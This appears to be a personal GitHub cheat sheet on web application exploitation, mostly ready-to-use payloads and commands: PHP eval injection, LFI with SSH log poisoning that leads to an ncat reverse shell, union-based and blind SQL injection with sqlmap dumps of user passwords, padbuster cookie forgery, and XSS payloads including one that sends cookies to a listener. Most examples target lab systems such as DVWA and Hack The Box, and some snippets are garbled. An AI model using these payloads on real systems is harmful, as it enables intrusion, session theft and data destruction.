<!-- # exploiting_web_application -->

# Server side EXploitation
## Some tricks and POC's about web app vulnerability
   ### ONline tools
       * https://whatcms.org/
       *
## 1. Remote code execution (RCE)
  * Example of Code Evaluation Exploitation
  You want to have dynamically generated variable names for every user and store its registration date. This is how it could be done in PHP:
  
          eval("\$$user = '$regdate');
    
  attacker
  
          x = 'y';phpinfo();//
          
 * Stored Remote Code Evaluation Explanation and Example
 An expected input could be like this:

             ?language=de
        
attacker in accept language
   
             de';phpinfo()//

### Testing blind RCE
 #### 1. use tcpdump to capture ICMP requests
 
        tcpdump -i eth0 icmp
      Example output
      
              16:17:46.354621 IP 10.79.97.62 > 216.58.200.14: ICMP echo request, id 33817, seq 1707, length 64
              16:17:46.399959 IP 216.58.200.14 > 10.79.97.62: ICMP echo reply, id 33817, seq 1707, length 64
  * With the following command, we can filter ICMP echo-reply, 
        
        tcpdump -i eth0 "icmp[0] == 0"  
  * To filter ICMP echo-requests, we can use this tcpdump command.

        tcpdump -i eth0 "icmp[0] == 8"
#### 2. Run python server and capture hit request
   then 
   
         wget http://atckerip:python2:serverport/file_in_attacker machine
 ### Pregmatch bypass
     
    <?php

      if ( isset($_GET['sauce']) ){
          highlight_file(__FILE__);
      }

      if ( !isset($_COOKIE['sessionHash']) )
      {

          echo "Something Wrong, try again.";
          header("Location: ../index.php");

      }

      else if ( $_COOKIE['sessionHash'] == hash("sha256", "guest") )
      {
          die("You Need to be admin to use this page.");
      }

      else if ( $_COOKIE['sessionHash'] == hash("sha256", "admin") )
      {

          if ( !isset($_GET["name"]) ) { die("Missing Parameters (name) !!"); } 
          $name = preg_replace('/\$|\(|\)|ls|cat|more|head|tail|pwd|ps|la|;|&|find/i', '', $_GET['name'] );

          system("echo \"Welcome $name\";");
          header("X-Leak: ?sauce");

      }
      else
          die('Something Wrong, try again.');
      Welcome admin
   
  Then in robots.txt
  Allow /etc/flag
  
  bypass  in url... It reads every thing that starts with fl in the direcory
     
        `nl /etc/fl*`
## 2. LOcal File Inclusion vulnerability (LFI)
  * A Local File Inclusion attack is used to trick the application into exposing or running files on the server.
      
      Example vulnerable code 
        
          $file = $_GET['FILE'];
          if(isset(''file))
          {
             include("$file");
          }
      Exploits
      
        ?file=/etc/passwd
        ?file=/var/log/auth.log
         
       ssh log poisoning .. Since the auth.log
 is public acccessibke then through lfi the  we can inject malicious log in it.. Via ssh
 
              ssh '<?php system($_GET['c']); ?>'@192.168.1.31
   RCE in LFI ==> after poisoning
   
          ?file=/var/log/auth.log&c=ls -la
          ?file=/var/log/auth.log&c=ncat -e /bin/bash 192.168.1.2 1234
  ## 3. SQL Injection
   SQi is a method by which an attacker exploits vulnerabilities in the way a `database executes search queries`. Attackers use SQi to gain access to unauthorized information, modify or create new user permissions, or otherwise manipulate or destroy sensitive data.
    
   Testing
      
       ' or 1=1;--
       " or 1=1;--
       ' or 1=1; drop table notes; —
       'John' or 'x'='x' AND Password = 'Smith’ or ‘x’=’x’;
       
  For Example, if you get an error message like ‘Internal Server Error‘ as a search result, then we can be sure that this attack is possible in that part of the system.

     Other results that may notify a possible attack include:
     Blank page loaded.
     No error or success messages – functionality and page do not react to the input.
     Success message for malicious code
  
  Vulnerable Parts of this Attack
Before starting the testing process, every sincere tester should more or less know which parts would be most vulnerable to this attack.

It is also a good practice to plan which field of the system is to be tested exactly and in what order. In my testing career, I have learned that it is not a good idea to test fields against SQL attacks randomly as some fields can be missed.

As this attack is being performed in the database, all data entry system parts, input fields, and website links are vulnerable.

Vulnerable parts include:

     Login fields
     Search fields
     Comment fields
     Any other data entry and saving fields
     Website links
It is important to note that while testing against this attack, it is not enough to check only one or a few fields. It is quite common, that one field may be protected against SQL Injection, but then another does not. Therefore it is important not to forget to test all the website’s field

  ###  testing SQL injection

### Error based
#### USING SQLMAP (AUTOMATED)
Also you can try SQLMAP in DVWA SQL INJECTION, it works just fine


  I did with sqlmap too but with use of burp suite


  where by you intercept message after try with to put any value in that website(for this it was id so i put 1)
  Then you save the request from burpsuite

  After that, you run sqlmap to test for it If it works

             sqlmap -r dvwa.sql

             It works for sqlmap



   Enumerate databases 

            sqlmap -r dvwa.sql --dbs

   We have two database which are dvwa and information_schema

   Enumerate tables

     -D for specification of database "dvwa"
     --tables looking for tables in database "dvwa"

                sqlmap -r dvwa.sql -D dvwa --tables

                 We have two tables which are guestbook && users

   Enumerate columns

               -D for specification of database "dvwa"
               -T for specification of table "users"
               --columns looking for columns in table "users" from database "dvwa"

                 sqlmap -r dvwa.sql -D dvwa -T users --columns

                     we find many columns but interest columns are user and password

   Retrieve data 

                  -D for specification of database "dvwa"
                  -T for specification of table "users"
                  -C for specification of columns "user" and password(interest columns)
                  --dump this enable us to see contents from user && password from table "users" in database "dvwa"

                           sqlmap -r dvwa.sql -D dvwa -T users -C user,password --dump




 ####  MANUAL--SQL-INJECTION: in MYSQL 
 
First you test if sql injection exist in a site
     
To test that you must ask yourself if what website is doing from where you want to inject a sql command, it interact with database

  If it interact with database, you are good to go && if not,bad luck for sql injection

Check if sql injection exist in that function of website

  NOTE: sql injection exist if that website did not not use  Parameterized Queries (aka Prepared Statements). Means concatenating user input with the query being executed.
  Example
    
    $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
               


  To check for SQL injection, test by `' or "` characters and chech for any errors if any

  if it bring you are good to go && if it does not, no luck && try to do more bypass restriction if you are sure that website, it has sql injection

Next stage try to find out what kind of database the webisite operate

                   
            ###For this I will show for Mysql
      
After that, what kind of injection that database we can retrieve data from database

Also if there some restriction in case of , and other characters, try to bypass them with

GITHUB PAGE FOR SQL INJECTION AND EVEN BYPASS: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL Injection

    Example:


     DVWA SQL INJECTION security: low


     first test for ' #SUCCESS FOR SQL INJECTION-- since it bring error && luck for us it bring error of Mysql

Practise:
i.  testing

    'test'test';  notes the error if it is error based
   
ii.  Enumerate information retrival 

     ' or 1=1  -- -
     
iii.  Enumerate database version 

    test' union select 1,@@version #
   
iv. Enumerate database names

    ' union select null,schema_name from information_schema.schemata #

v.  Enumerate tables on database found above

      ' union select null,table_name from information_schema.tables where table_schema = 'dvwa' #
vi.  Enumerating columnsnames in the table identified above
 
        
     ' union select 1,column_name from information_schema.columns where table_name = 'users' #
 vii. Retriving data from the columns of tables identofied above
  
        ' union select user,password from users #

viii. Cracking hashes if found in the tables above

   second the database explain in first error with this `'` in which is mysql

   third we have to find what kind of injection we can do to Mysql

   Let us start with "order by" to what number of columns database has 

                1. ' order by 1-- -   No error for this
                2. ' order by 2-- -   Also No error
                3. ' order by 3-- -   We get error that "Unknown column '3' in 'order clause'" ,you might get different error

 From error, we know that there are two columns

 After let us try union select

 since we know there are two column let us check for those two

                1. ' union select 1,2-- -
It works by bring data from the column that has effect from sql injection
       From here, it bring 1 && 2 columns that has effect for sql injection

More verification, let us try if we can change value by using union injection

                      1. ' union select "blackninja23","Hack"-- -
We overide the value for those columns both 1 && 2 so both has sql injection error

Let retrieve data from database from those affected columns 1&&2
 1.Let us know the user of this database from either 1 or 2 columns since there are both affected columns

Using 

       ' union select (user()),(user())-- -
    
                        the user is dvwa@localhost
  2.Check for name of database

                    i.  Using ' union select (select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),2-- -
                    ii. ‘ UNION ALL SELECT NULL,concat(schema_name),NULL,NULL FROM information_schema.schemata#


where by group_concat will help us to merge data since there are many data from different columns

We have information_schema && dvwa----database name

                     Try to separate data we try separator if it works

                              Using ' union select (select group_concat(SCHEMA_NAME SEPARATOR '\n') from INFORMATION_SCHEMA.SCHEMATA),2-- -

                              I works

3.Check for tables in database "dvwa"

                           Using ' union select (select group_concat(TABLE_NAME SEPARATOR '\n') from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = 'dvwa'),2-- -


 4. Check for columns for their respective tables

                            ' union select (select group_concat(TABLE_NAME ,":", COLUMN_NAME SEPARATOR '\n')from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = 'dvwa'),2-- -


                                 we have interest informations for users-- user && password

 5. Retrieve data "user "&&"password" from table "users" from database "dvwa"

                        Notes that in here we use their value to extract data from databases
                        we specify columns for user && password from database "dvwa" in table "users"

                                ' union select (select group_concat(user," ",password SEPARATOR '\n')from dvwa.users),2-- -

                        We have successful retrieve name for users and their password

                           For more information of users


                               ' union select (select group_concat(user," ",password," ",first_name," ",last_name SEPARATOR '\n')from dvwa.users),2-- -
 
 ### Blind based sql injection
    
Blind SQL Injections occur when the affected application:

    1. Does NOT return any SQL error messages or output.

     2. Does NOT output any data to the user.


 Testing
   
      1' union select 1,user() -- -
 In Blind Boolean-Based SQL Injections, we can ask the database a series of true or false questions to extract information.
 For instance, we can ask the question, is the first character of the server's hostname a? If this is true, the application will return the message User ID exists in the database..
FIRST CHARACTER: 
   
    1' AND SUBSTRING(user(),1,1)='r' -- 
SECOND CHARACTER:
   
    1' AND SUBSTRING(user(),1,2)='ro' -- -
    
  ### USing sql map more
  
   1. check logged in user prevelege
   
            sqlmap -u "http://192.168.125.150/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=r97n54ijbn5m8ofn0ug04fk9d7;security=low" --keep-alive --threads 8 --risk 3 --level 5 --dbms=mysql --current-user --privileges

2. Reading files from server if current user has read access permission


          sqlmap -u "http://192.168.125.150/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=r97n54ijbn5m8ofn0ug04fk9d7;security=low" --keep-alive --threads 8 --risk 3 --level 5 --dbms=mysql --current-user --batch --file-read "/var/log/apache2/access.log"
          
 ## 4. OS Command Injection
 
  Executing os specific commands
   * In url
   
         /index.php?arg=1; phpinfo()
        
 ## 5. Padding oracle Attack
          
   Detecting.
   
   -When a user autologin after account creation
   
   -When the same value of cookie occurs all time the user log in again (It should be different if secure  
     
   Attack
   
   * Using padbuster. Decrypt the given cookie after you create account
       
            padbuster  http://overflow.htb/home/index.php  WZ289JlHbbUU9GGQ%2F7x%2Fyj9i6pi052tC 8 --cookie "auth=WZ289JlHbbUU9GGQ%2F7x%2Fyj9i6pi052tC" 
            
   output

            Block 1 Results:
            [+] Cipher Text (HEX): 14f46190ffbc7fca
            [+] Intermediate Bytes (HEX): 2ceed986a43708c1
            [+] Plain Text: user=pet
   Then create new admin user cookie
    
         padbuster  http://overflow.htb/home/index.php  WZ289JlHbbUU9GGQ%2F7x%2Fyj9i6pi052tC 8 --cookie "auth=WZ289JlHbbUU9GGQ%2F7x%2Fyj9i6pi052tC" -plaintext 'user=admin'
 
 reference
     * https://forum.hackthebox.com/t/lazy-mini-writeup-ways-to-login/88
     
 ## 5. Denial-of-service (DoS) and distributed denial-of-service (DDoS) attacks -
 
   Through a variety of vectors, attackers are able to overload a targeted server or its surrounding infrastructure with different types of attack traffic. When a server is no longer able to effectively process incoming requests, it begins to behave sluggishly and eventually deny service to incoming requests from legitimate users.
   
  ==================================================== <br>

# Client side Exploitation
  ==================================================== <br>

## Cross site scripting (XSS)

   XSS is a vulnerability that allows an attacker to inject client-side scripts into a webpage in order to access important information directly, impersonate the user, or trick the user into revealing important information.
 
## XSS(Reflected)
### Basic XSS
  * Testing.  
      check if html tags are processed --> if <b> tags will be removed then your good to go next step
 
    Eg.
    
           <b> testing</b>
 
exploit
 
              <script>alert('Hello XSS')</script>
    
  * redirecting 
           
          <script>document.location = "http://google.com"</script>
    
  * Iframe injection (load arbitrary code in the browser)
  
         <iframe src="http://uwo.ca"></iframe>
 ### More Complex XSS
 * changing elements in the DOM --> It will change the 17th tag to point to evilsite.com
  
           <script>
           window.onload = function() {
             s=document.getElementsByTagName("a")[17];
             s.href="http://evilsite.com";
             s.text="http://evilsite.com";s.style.color="red";
              }
           </script>
    
   * url encoded aove script  
   
                %3C%73%63%72%69%70%74%3E%77%69%6E%64%6F%77%2E%6F%6E%6C%6F%61%64=%66%75%6E%63%74%69%6F%6E%28%29%7B%73=%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%4  2%79%54%61%67%4E%61%6D%65%28%22%61%22%29%5B%31%37%5D%3B%73%2E%68%72%65%66=%22%68%74%74%70%3A%2F%2F%65%76%69%6C%73%69%74%65%2E%63%6F%6D%22%3B%73%2E%74%65%78%74=%22%68%74%74%70%3A%2F%2F%65%76%69%6C%73%69%74%65%2E%63%6F%6D%22%3B%73%2E%73%74%79%6C%65%2E%63%6F%6C%6F%72=%22%72%65%64%22%3B%7D%3C%2F%73%63%72%69%70%74%3E

### Stealing a cookie

       <script>new Image ().src="http://localhost:1234/"+document.cookie;</script>
   or
       
       <IMG src=1 onerror=alert(document.cookie)>
    
  * netcat listerner
       
        netcat -lvp 1234
  * using the stolen cookie to impesonate user ---> in DVWA changing the password of user

        curl --cookie "/security=low;%20PHPSESSID=kavqn49seghn91lcbs6j411v75" --location "localhost/dvwa/vulnerabilities/csrf/?password_new=chicken&password_conf=chicken&Change=Change#" | grep "Password"
 
## XSS(Stored)
*  website allows users to submit comments on blog posts, which are displayed to other users. It executes when user visits that site
   
     
          <script>alert(document.cookie)</script>
          <IMG src=1 onerror=alert(document.cookie)>
          <scr<script>ipt>alert(document.cookie)</script>
        
 ## XSS from HACKERONE
   * Stored email contact like below in general account settings 
     It is stored xss
     
          `luc1d"><img/src="x"onerror=alert(document.domain)>@wearehackerone.com`
      
        or
          
            `jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt    /--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`
   
     
 #### mitigation
        
        
                      <?php 
                     $name = $_GET['name']; 
                     if (strpos($name, 'script') !== false) 
                     { http_response_code(403); die('Forbidden'); } 
                     ?>  
        
          
        
#### Effects of XSS
   * Stealing a cookie who will trigger XSS
   * redirecting to malicios pages
   * making request on behalf of the user who triggered the xss
   * DOM based attacks. Example changing the link/adding.. pointing to malicious.com
 
## Attacking wordpress
        * https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress
           
 1.  Extract versions in general
      
      `curl -s -X GET https://example.com | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F       "THIIIIS" '{print $2}' | cut -d "'" -f2`
        
  2. 

        
 ## Internet services. 
        
   * SOCKS
        https://securityintelligence.com/posts/socks-proxy-primer-what-is-socks5-and-why-should-you-use-it/
        
           SOCKS, which stands for Socket Secure, is a network protocol that facilitates communication with servers through a firewall by routing network traffic to the actual server on behalf of a client. SOCKS is designed to route any type of traffic generated by any protocol or program. Since SOCKS sits at layer 5, between SSL (layer 7) and TCP/UDP (layer 4), it can handle several request types, including HTTP, HTTPS, POP3, SMTP and FTP. As a result, SOCKS can be used for email, web browsing, peer-to-peer sharing, file transfers and more.
        There are only two versions: SOCKS4 and SOCKs5. The main differences between SOCKs5 and SOCKS4 are:

SOCKS4 doesn’t support authentication, while SOCKs5 supports a variety of authentication methods; and
SOCKS4 doesn’t support UDP proxies, while SOCKs5 does.
A SOCKs5 proxy is more secure because it establishes a full TCP connection with authentication and uses the Secure Shell (SSH) encrypted tunneling method to relay the traffic.

   Setting Up a SOCKs5 Proxy Connection
To SOCKSify an IT environment, the client application must have the capacity to support the SOCKs5 protocol. The syntax below is based on the SSH client on Linux; it shows how to create a SOCKs5 proxy server running on your local computer and then authenticate to the Edge node of a cluster or gateway hosted on cloud that routes traffic to the servers inside the cluster:
        

      `$ ssh -D 30001 root@EdgeNodeSSHserverIP -C -f -N (password: xyz; or`
      `$ ssh -i /path/to/private_key -D 30001 root@EdgeNodeSSHserverIP -C -f -N`

* VPN 
        
           VPNs don't so much bypass firewalls as they tunnel through them. Almost all VPNs have a tunneling protocol that masks your traffic, giving you complete anonymity and security while browsing the web. By connecting to a server in a location of your choosing, you will receive a new IP address.

* VPS     
        VPS (Virtual Private Server) is a hosting service that uses virtualization technology to provide you with dedicated (private) resources on a server with multiple users. VPS is a more secure and stable solution than shared hosting where you don't get a dedicated server space
        
* RDP 
        
Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection. The user employs RDP client software for this purpose, while the other computer must run RDP server software
